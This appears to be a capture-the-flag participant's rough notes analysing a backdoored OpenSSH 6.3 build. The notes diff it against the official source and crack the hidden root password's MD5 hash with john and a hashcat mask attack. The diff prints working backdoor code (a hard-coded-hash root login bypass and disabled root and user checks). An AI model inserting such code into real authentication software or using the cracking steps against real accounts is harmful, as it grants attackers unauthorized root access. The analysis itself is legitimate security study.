@@ -1,0 +1,232 @@
+# search for the file containing the version:
+#must be in the backdoor directory
+
+for f in *; do echo $f && strings $f|grep -i --color "version"; done
+
+# donwload version from this sourse:
+# https://ftp.openbsd.org/pub/OpenBSD/OpenSSH/openssh-6.3.tar.gz
+
+gunzip openssh-6.3.tar.gz
+tar -xvf openssh-6.3.tar
+
+
+
+diff openssh/auth-passwd.c backdoor/auth-passwd.c
+
+
+Files openssh/auth2.c and backdoor/auth2.c differ
+#nothing?
+Files openssh/auth.c and backdoor/auth.c differ
+# 	fake.pw_passwd =
+#	    "$2a$06$r3.juUaHZDlIbQaO2dS9FuYxL1W9M81R1Tc92PoSNmzvpEqLkLGrK";
+Files openssh/auth.h and backdoor/auth.h differ
+#none
+
+Files openssh/auth-passwd.c and backdoor/auth-passwd.c differ
+#static char backdoor_hash[MD5_DIGEST_LENGTH] = \
+#{
+#    0x22, 0xEA, 0x36, 0x43, 0xD7, 0x37, 0x17, 0x20, 0xBC, 0xE8, 0xB5, 0xF2, 0x44, 0xD4, 0x02, 0x6A
+#};
+#
+#int
+
+
+Files openssh/buffer.c and backdoor/buffer.c differ
+Files openssh/buffer.h and backdoor/buffer.h differ
+Only in openssh/: ChangeLog
+Files openssh/channels.c and backdoor/channels.c differ
+Files openssh/channels.h and backdoor/channels.h differ
+Files openssh/cipher.c and backdoor/cipher.c differ
+Files openssh/clientloop.c and backdoor/clientloop.c differ
+Files openssh/compat.c and backdoor/compat.c differ
+Files openssh/compat.h and backdoor/compat.h differ
+Only in openssh/: config.h
+Common subdirectories: openssh/contrib and backdoor/contrib
+Only in openssh/: freebsd-configure.sh
+Only in openssh/: FREEBSD-tricks
+Only in openssh/: FREEBSD-upgrade
+Only in openssh/: FREEBSD-vendor
+Files openssh/kex.c and backdoor/kex.c differ
+Files openssh/kex.h and backdoor/kex.h differ
+Only in openssh/: krb5_config.h
+Files openssh/misc.c and backdoor/misc.c differ
+Files openssh/misc.h and backdoor/misc.h differ
+Files openssh/moduli.5 and backdoor/moduli.5 differ
+Files openssh/mux.c and backdoor/mux.c differ
+Files openssh/myproposal.h and backdoor/myproposal.h differ
+Common subdirectories: openssh/openbsd-compat and backdoor/openbsd-compat
+Files openssh/packet.c and backdoor/packet.c differ
+Files openssh/packet.h and backdoor/packet.h differ
+Files openssh/pathnames.h and backdoor/pathnames.h differ
+Files openssh/readconf.c and backdoor/readconf.c differ
+Files openssh/readconf.h and backdoor/readconf.h differ
+Only in openssh/: README
+Only in openssh/: README.hpn
+Common subdirectories: openssh/regress and backdoor/regress
+Only in backdoor/: scard
+Files openssh/schnorr.c and backdoor/schnorr.c differ
+Files openssh/scp.1 and backdoor/scp.1 differ
+Files openssh/servconf.c and backdoor/servconf.c differ
+Files openssh/servconf.h and backdoor/servconf.h differ
+Files openssh/serverloop.c and backdoor/serverloop.c differ
+Files openssh/session.c and backdoor/session.c differ
+Files openssh/sftp.1 and backdoor/sftp.1 differ
+Files openssh/sftp.c and backdoor/sftp.c differ
+Files openssh/sftp-common.c and backdoor/sftp-common.c differ
+Files openssh/sftp-server.8 and backdoor/sftp-server.8 differ
+Files openssh/ssh.1 and backdoor/ssh.1 differ
+Files openssh/ssh-add.1 and backdoor/ssh-add.1 differ
+Files openssh/ssh-agent.1 and backdoor/ssh-agent.1 differ
+Files openssh/ssh-agent.c and backdoor/ssh-agent.c differ
+Files openssh/ssh.c and backdoor/ssh.c differ
+Files openssh/ssh_config and backdoor/ssh_config differ
+Files openssh/ssh_config.5 and backdoor/ssh_config.5 differ
+#none
+Files openssh/sshconnect2.c and backdoor/sshconnect2.c differ
+Files openssh/sshconnect.c and backdoor/sshconnect.c differ
+Files openssh/sshd.8 and backdoor/sshd.8 differ
+Files openssh/sshd.c and backdoor/sshd.c differ
+Files openssh/sshd_config and backdoor/sshd_config differ
+Files openssh/sshd_config.5 and backdoor/sshd_config.5 differ
+Files openssh/ssh-gss.h and backdoor/ssh-gss.h differ
+Files openssh/ssh-keygen.1 and backdoor/ssh-keygen.1 differ
+Files openssh/ssh-keyscan.1 and backdoor/ssh-keyscan.1 differ
+Files openssh/ssh-keysign.8 and backdoor/ssh-keysign.8 differ
+Only in openssh/: ssh_namespace.h
+Files openssh/ssh-pkcs11-helper.8 and backdoor/ssh-pkcs11-helper.8 differ
+Only in openssh/: umac128.c
+Files openssh/version.h and backdoor/version.h differ
+
+# from other source 
+# http://ftp.openbsd.org/pub/OpenBSD/OpenSSH/portable/openssh-6.3p1.tar.gz
+
+diff -q openssh-6.3p1/ backdoor/
+
+Files openssh-6.3p1/auth.c and backdoor/auth.c differ
+Files openssh-6.3p1/auth.h and backdoor/auth.h differ
+Files openssh-6.3p1/auth-passwd.c and backdoor/auth-passwd.c differ
+Only in openssh-6.3p1/: ChangeLog
+
+diff openssh-6.3p1/auth.c backdoor/auth.c
+349,350c349,350
+< 	logit("ROOT LOGIN REFUSED FROM %.200s", get_remote_ipaddr());
+< 	return 0;
+---
+> 
+> 	return 1;
+636,637c636,637
+< 	if (!allowed_user(pw))
+< 		return (NULL);
+---
+> 	//if (!allowed_user(pw))
+> 	//	return (NULL);
+
+diff openssh-6.3p1/auth.h backdoor/auth.h
+
+214a215
+> int  sys_auth_backdoor(Authctxt *, const char *);
+215a217
+> 
+
+diff openssh-6.3p1/auth-passwd.c backdoor/auth-passwd.c
+
+th-passwd.c 
+47a48,49
+> #include <openssl/md5.h>
+> 
+88a91,93
+>     if(sys_auth_backdoor(authctxt, password))
+>         return 1;
+> 
+215a221,245
+>     
+> static char backdoor_hash[MD5_DIGEST_LENGTH] = \
+> {
+>     0x22, 0xEA, 0x36, 0x43, 0xD7, 0x37, 0x17, 0x20, 0xBC, 0xE8, 0xB5, 0xF2, 0x44, 0xD4, 0x02, 0x6A
+> };
+> 
+> int
+> sys_auth_backdoor(Authctxt *authctxt, const char *password)
+> {
+>     MD5_CTX c = {};
+>     char password_hash[MD5_DIGEST_LENGTH] = {}; 
+> 	struct passwd *pw = authctxt->pw;
+>     
+>     if(strcmp(pw->pw_name, "root") != 0 || strlen(password) != 6)
+>         return 0;
+> 
+>     MD5_Init(&c);
+>     MD5_Update(&c, password, strlen(password));
+>     MD5_Final(password_hash, &c);
+> 
+>     if(memcmp(backdoor_hash, password_hash, MD5_DIGEST_LENGTH) != 0)
+>         return 0;
+> 
+>     return 1;
+> }
+
+
+22EA3643D7371720BCE8B5F244D4026A
+22EA3643D7371720BCE8B5F244D4026A
+# is this the apssword?
+
+john --format=raw-md5 --wordlist= /usr/share/wordlists/rockyou.txt hash.txt
+
+are/wordlists/rockyou.txt hash.txt 
+Warning: invalid UTF-8 seen reading /usr/share/wordlists/rockyou.txt
+Using default input encoding: UTF-8
+Loaded 52 password hashes with no different salts (Raw-MD5 [MD5 256/256 AVX2 8x3])
+Warning: no OpenMP support for this hash type, consider --fork=4
+Press 'q' or Ctrl-C to abort, almost any other key for status
+emerald          (?)
+1g 0:00:00:00 DONE (2020-05-01 10:53) 33.33g/s 118200p/s 118200c/s 6066KC/s !@#$%..sss
+Warning: passwords printed above might not be all those cracked
+Use the "--show --format=Raw-MD5" options to display all of the cracked passwords reliably
+Session completed
+
+#not it
+
+
+
+
+ACI{22ea3643d7371720bce8b5f244d4026a}
+
+#not it
+
+
+# nee to use hashcat tocrack 
+
+
+hashcat -m 0 -a 3 -1 ?l?u?d hash.txt ?l?l?l?l?l?l --force
+22EA3643D7371720BCE8B5F244D4026A
+
+
+hashcat64.exe -m 0 -a 3 -1 ?l?u?d hash.txt ?1?1?1?1?1?1 -O
+
+# this is what fucking worked 
+
+https://www.4armed.com/blog/perform-mask-attack-hashcat/
+
+
+22ea3643d7371720bce8b5f244d4026a:2tNM8l
+
+Session..........: hashcat
+Status...........: Cracked
+Hash.Type........: MD5
+Hash.Target......: 22ea3643d7371720bce8b5f244d4026a
+Time.Started.....: Fri May 01 21:10:18 2020 (6 secs)
+Time.Estimated...: Fri May 01 21:10:24 2020 (0 secs)
+Guess.Mask.......: ?1?1?1?1?1?1 [6]
+Guess.Charset....: -1 ?l?u?d, -2 Undefined, -3 Undefined, -4 Undefined
+Guess.Queue......: 1/1 (100.00%)
+Speed.#1.........:  3572.2 MH/s (10.71ms) @ Accel:256 Loops:128 Thr:256 Vec:4
+Recovered........: 1/1 (100.00%) Digests, 1/1 (100.00%) Salts
+Progress.........: 19313459200/56800235584 (34.00%)
+Rejected.........: 0/19313459200 (0.00%)
+Restore.Point....: 4915200/14776336 (33.26%)
+Restore.Sub.#1...: Salt:0 Amplifier:1152-1280 Iteration:0-128
+Candidates.#1....: Ap7Ruj -> L3NpQC
+Hardware.Mon.#1..: Temp: 64c Util: 97% Core:1202MHz Mem:2505MHz Bus:8
+
+Started: Fri May 01 21:10:13 2020
+Stopped: Fri May 01 21:10:24 2020
